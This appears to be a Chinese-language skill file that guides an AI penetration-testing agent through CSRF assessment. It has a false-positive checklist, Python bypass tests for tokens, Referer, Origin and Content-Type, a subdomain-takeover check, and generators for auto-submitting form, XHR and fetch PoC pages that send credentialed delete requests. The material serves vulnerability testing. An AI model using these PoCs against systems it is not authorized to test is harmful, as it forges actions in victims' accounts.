---
name: csrf-methodology
description: "CSRF漏洞完整方法论 — 覆盖CSRF真假判定、Token检测、Referer/Origin验证、SameSite绕过、JSON内容类型绕过、子域利用。任何出现CSRF、跨站请求伪造的场景都必须使用此skill。"
priority: 10
vuln_types:
  - CSRF
  - 跨站请求伪造
  - CSRF绕过
  - Token缺失
  - Referer验证绕过
triggers:
  - csrf
  - cross-site
  - request-forgery
  - token
  - referer
  - origin
  - SameSite
  - CSRF
  - 跨站请求伪造
synonyms:
  - csrf
  - cross-site request forgery
  - csrf bypass
  - token missing
  - referer bypass
  - origin bypass
metadata:
  tags: "csrf,跨站请求伪造,token,referer,origin,samesite,cookie,安全头,跨域"
  category: discovery
  authority: "expert"
---

# CSRF漏洞完整方法论

> **核心原则**：CSRF成立的前提 = 受害者浏览器带合法认证Cookie主动发请求，服务端仅凭Cookie判身份、不校验CSRF Token/Referer/Origin

## 🤖 Agent 工具映射

| 场景 | 优先使用的 Agent 工具 |
|------|------------------------|
| 拦截表单提交、AJAX请求，检查CSRF Token | `proxy_get_traffic` + `proxy_get_flow_detail` |
| 删除/修改CSRF Token字段，验证服务端是否校验 | `proxy_replay` / `proxy_send_request` |
| 伪造跨站Referer/Origin，验证是否绕过 | `proxy_send_request` |
| 检查Cookie的SameSite属性 | `browser_get_cookies` |
- 构造PoC HTML页面验证CSRF | `browser_navigate` + `browser_evaluate` |
| 固化CSRF证据 | `checklist_mark` + `note_add` |

---

## 0. 立即执行摘要：CSRF真假判定铁律 (FALSE POSITIVE GUARD)

> **实战教训**：用户曾用浏览器改包POST deleteFtpInfo问"是否算CSRF"，本质是没带Cookie验证流程；脚本csrf_sqli_verify.py才是正确的CSRF坐实姿势。

看到任何CSRF相关请求时，**必须先执行真假判定**，避免误报：

### CSRF成立的前提条件

```
CSRF成立 = 以下条件全部满足：
1. 受害者浏览器带合法认证Cookie
2. 服务端仅凭Cookie判身份
3. 不校验CSRF Token / Referer / Origin
4. 请求执行了副作用（修改数据、执行操作）
```

### 判定铁律 (三步)

| 步骤 | 测试 | 预期结果 | 判定 |
|------|------|---------|------|
| **Step 1** | 带合法Cookie + 伪造跨站Referer/Origin | 副作用执行成功 | **CSRF成立 (Medium)** |
| **Step 2** | 不带Cookie + 伪造请求 | 返回200但无实际效果 | ≠ CSRF，是"未授权访问"再次印证 |
| **Step 3** | 带Cookie + 同域Referer | 正常业务 | 不能作为CSRF证据 |

### 常见误判排除

| 误判场景 | 正确判定 | 原因 |
|---------|---------|------|
| 不带Cookie的脚本返回200 | **不是CSRF** | 未授权访问的印证 |
| 带Cookie + 同域Referer成功 | **不是CSRF** | 正常业务请求 |
| 仅修改HTTP方法（GET→POST） | **需验证** | 可能只是方法切换 |
| 响应是302重定向 | **需验证** | 可能是登录页重定向 |

---

## 1. CSRF Token检测

### 1.1 Token存在性检测

```python
def detect_csrf_token(request: dict) -> bool:
    """
    检测请求中是否存在CSRF Token
    """
    # 常见CSRF Token字段名
    token_fields = [
        "csrf_token", "_csrf", "csrf", "xsrf", "_xsrf",
        "token", "_token", "authenticity_token",
        "csrfmiddlewaretoken", "__RequestVerificationToken"
    ]
    
    # 检查URL参数
    if request.get("query"):
        for field in token_fields:
            if field in request["query"].lower():
                return True
    
    # 检查Body参数
    if request.get("body"):
        for field in token_fields:
            if field in request["body"].lower():
                return True
    
    # 检查Header
    if request.get("headers"):
        for field in ["x-csrf-token", "x-xsrf-token", "x-requested-with"]:
            if field in request["headers"]:
                return True
    
    return False
```

### 1.2 Token验证绕过测试

```python
async def test_csrf_token_bypass(task):
    """
    测试CSRF Token验证是否有效
    """
    # 测试1：删除Token字段
    resp1 = await send_request_without_field(task, "csrf_token")
    if resp1.success:
        return "Token删除绕过"
    
    # 测试2：修改Token值
    resp2 = await send_request_with_modified_token(task)
    if resp2.success:
        return "Token修改绕过"
    
    # 测试3：使用空Token
    resp3 = await send_request_with_empty_token(task)
    if resp3.success:
        return "空Token绕过"
    
    # 测试4：使用固定Token（如123456）
    resp4 = await send_request_with_fixed_token(task, "123456")
    if resp4.success:
        return "固定Token绕过"
    
    return "Token验证有效"
```

---

## 2. Referer/Origin验证

### 2.1 Referer验证绕过

```python
async def test_referer_bypass(task):
    """
    测试Referer验证是否可绕过
    """
    # 绕过1：删除Referer头
    resp1 = await send_request_without_header(task, "Referer")
    if resp1.success:
        return "删除Referer绕过"
    
    # 绕过2：使用空Referer
    resp2 = await send_request_with_header(task, "Referer", "")
    if resp2.success:
        return "空Referer绕过"
    
    # 绕过3：使用目标域名的子域名
    subdomain = f"https://{random_subdomain()}.{target_domain}"
    resp3 = await send_request_with_header(task, "Referer", subdomain)
    if resp3.success:
        return "子域名Referer绕过"
    
    # 绕过4：使用目标域名的子路径
    subpath = f"https://{target_domain}/legitimate-page"
    resp4 = await send_request_with_header(task, "Referer", subpath)
    if resp4.success:
        return "子路径Referer绕过"
    
    # 绕过5：使用URL编码
    encoded = f"https://{target_domain}%2Flegitimate-page"
    resp5 = await send_request_with_header(task, "Referer", encoded)
    if resp5.success:
        return "URL编码Referer绕过"
    
    # 绕过6：使用反斜杠
    backslash = f"https:{target_domain}\\@evil.com"
    resp6 = await send_request_with_header(task, "Referer", backslash)
    if resp6.success:
        return "反斜杠Referer绕过"
    
    return "Referer验证有效"
```

### 2.2 Origin验证绕过

```python
async def test_origin_bypass(task):
    """
    测试Origin验证是否可绕过
    """
    # 绕过1：删除Origin头
    resp1 = await send_request_without_header(task, "Origin")
    if resp1.success:
        return "删除Origin绕过"
    
    # 绕过2：使用null Origin
    resp2 = await send_request_with_header(task, "Origin", "null")
    if resp2.success:
        return "null Origin绕过"
    
    # 绕过3：使用目标域名
    resp3 = await send_request_with_header(task, "Origin", f"https://{target_domain}")
    if resp3.success:
        return "目标域名Origin绕过"
    
    return "Origin验证有效"
```

---

## 3. SameSite Cookie绕过

### 3.1 SameSite属性检测

```python
def detect_samesite_cookie(cookie: str) -> str:
    """
    检测Cookie的SameSite属性
    """
    cookie_lower = cookie.lower()
    if "samesite=strict" in cookie_lower:
        return "Strict"
    elif "samesite=lax" in cookie_lower:
        return "Lax"
    elif "samesite=none" in cookie_lower:
        return "None"
    else:
        return "Not Set"
```

### 3.2 SameSite绕过技术

| SameSite值 | 绕过方法 | 适用场景 |
|------------|---------|---------|
| **Strict** | 通过同站请求触发 | 需要受害者在目标站点上 |
| **Lax** | 通过顶级导航GET请求 | 仅适用于GET请求 |
| **None** | 无SameSite限制 | 直接跨站请求 |
| **Not Set** | 浏览器默认行为（Lax） | 同Lax绕过 |

---

## 4. JSON内容类型绕过

### 4.1 Content-Type绕过

```python
async def test_content_type_bypass(task):
    """
    测试Content-Type验证是否可绕过
    """
    # 绕过1：使用text/plain
    resp1 = await send_request_with_content_type(task, "text/plain")
    if resp1.success:
        return "text/plain绕过"
    
    # 绕过2：使用multipart/form-data
    resp2 = await send_request_with_content_type(task, "multipart/form-data")
    if resp2.success:
        return "multipart/form-data绕过"
    
    # 绕过3：使用application/x-www-form-urlencoded
    resp3 = await send_request_with_content_type(task, "application/x-www-form-urlencoded")
    if resp3.success:
        return "application/x-www-form-urlencoded绕过"
    
    return "Content-Type验证有效"
```

---

## 5. 子域利用

### 5.1 子域接管检测

```python
def detect_subdomain_takeover(subdomain: str) -> bool:
    """
    检测子域名是否可被接管
    """
    # 检查CNAME记录
    cname = resolve_cname(subdomain)
    if cname:
        # 检查是否指向已过期的服务
        expired_services = [
            "herokuapp.com", "github.io", "s3.amazonaws.com",
            "cloudfront.net", "azurewebsites.net"
        ]
        for service in expired_services:
            if service in cname:
                return True
    return False
```

### 5.2 子域CSRF利用

```python
def generate_subdomain_csrf_poc(target_url: str, subdomain: str) -> str:
    """
    生成利用子域的CSRF PoC
    """
    poc = f"""
    <html>
    <body>
    <script>
    // 利用子域发送请求
    fetch('{target_url}', {{
        method: 'POST',
        credentials: 'include',
        headers: {{
            'Content-Type': 'application/x-www-form-urlencoded'
        }},
        body: 'action=delete&id=123'
    }});
    </script>
    </body>
    </html>
    """
    return poc
```

---

## 6. CSRF PoC生成

### 6.1 自动提交表单PoC

```python
def generate_auto_submit_poc(url: str, params: dict) -> str:
    """
    生成自动提交表单的CSRF PoC
    """
    params_html = "".join([
        f'<input type="hidden" name="{k}" value="{v}" />' for k, v in params.items()
    ])
    
    poc = f"""
    <html>
    <body>
    <form action="{url}" method="POST" id="csrf-form">
        {params_html}
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
    </body>
    </html>
    """
    return poc
```

### 6.2 XMLHttpRequest PoC

```python
def generate_xhr_poc(url: str, method: str, params: dict) -> str:
    """
    生成XMLHttpRequest的CSRF PoC
    """
    params_str = "&".join([f"{k}={v}" for k, v in params.items()])
    
    poc = f"""
    <html>
    <body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('{method}', '{url}', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('{params_str}');
    </script>
    </body>
    </html>
    """
    return poc
```

### 6.3 Fetch API PoC

```python
def generate_fetch_poc(url: str, method: str, params: dict) -> str:
    """
    生成Fetch API的CSRF PoC
    """
    params_str = "&".join([f"{k}={v}" for k, v in params.items()])
    
    poc = f"""
    <html>
    <body>
    <script>
    fetch('{url}', {{
        method: '{method}',
        credentials: 'include',
        headers: {{
            'Content-Type': 'application/x-www-form-urlencoded'
        }},
        body: '{params_str}'
    }});
    </script>
    </body>
    </html>
    """
    return poc
```

---

## 7. 结果判定与误报排除

### 结果分级

- `confirmed_vuln`：有明确的CSRF Token缺失/绕过、Referer/Origin绕过、副作用执行成功证据
- `suspected_vuln`：存在CSRF Token弱验证或Referer验证不严格，但未完成最终利用
- `needs_review`：缺少测试条件（如同站环境、子域接管能力）
- `not_vuln`：完成CSRF Token、Referer/Origin、SameSite、Content-Type检查后无异常

### 误报排除

- **不带Cookie的200响应不是CSRF**：这是"未授权访问"的印证
- **带Cookie + 同域Referer成功不是CSRF**：这是正常业务请求
- **GET请求的成功不是CSRF**：CSRF通常需要POST/PUT/DELETE
- **响应是登录页重定向不是CSRF**：这是未认证的印证

---

## ⛔ 「最低必测自检」— 标 not_vuln/skipped 前必答

| # | 必测项 | 跳过的合法理由 |
|---|--------|---------------|
| 1 | **CSRF Token存在性**：检查请求中是否有CSRF Token字段 | 接口无状态变更（GET请求） |
| 2 | **CSRF Token验证**：删除/修改Token，验证服务端是否校验 | 接口无CSRF Token |
| 3 | **Referer验证**：删除Referer头，验证是否绕过 | 接口无Referer验证 |
| 4 | **Origin验证**：删除Origin头，验证是否绕过 | 接口无Origin验证 |
| 5 | **SameSite Cookie**：检查Cookie的SameSite属性 | Cookie未设置SameSite |
| 6 | **Content-Type绕过**：使用text/plain等Content-Type | 接口只接受JSON |
| 7 | **子域利用**：检查是否有可接管的子域名 | 无子域名或子域名不可控 |

---

## 输出格式

```text
[CSRF检查]
入口/接口：POST /api/action
CSRF Token：存在/缺失/验证有效/验证绕过
Referer验证：存在/缺失/验证有效/验证绕过
Origin验证：存在/缺失/验证有效/验证绕过
SameSite Cookie：Strict/Lax/None/Not Set
Content-Type验证：有效/绕过
副作用：数据修改/执行操作/无
结论：confirmed_vuln | suspected_vuln | needs_review | not_vuln
假阳性排除：未带Cookie/同域Referer/GET请求/登录重定向/无
```

---

## 真实案例速查表

| 目标 | 漏洞 | 关键发现技巧 |
|------|------|-------------|
| AOMS deleteFtpInfo | CSRF（无Token验证） | 删除Token后仍可执行删除操作 |
| 某OA系统 | CSRF绕过（Referer验证不严） | 使用子路径绕过Referer验证 |
| 某电商平台 | JSON CSRF（Content-Type绕过） | 使用text/plain绕过Content-Type验证 |

---

## ⚠️ Skill边界与逃逸

| 现场信号 | 应跳转/联动的Skill |
|---|---|
| 接口有SQL注入风险 | `sqli-methodology` |
| 接口有XSS风险 | `xss-methodology` |
| 接口有文件上传功能 | `file-upload-methodology` |
| 需要认证才能测试 | `auth-bypass-methodology` |
| 需要越权测试 | `idor-methodology` |
| 需要测试密码重置 | `password-reset-attack` |

<!-- 数据源：AOMS实战经验 + WooYun漏洞数据库 + HackerOne报告 · 方法论 v1.0 -->
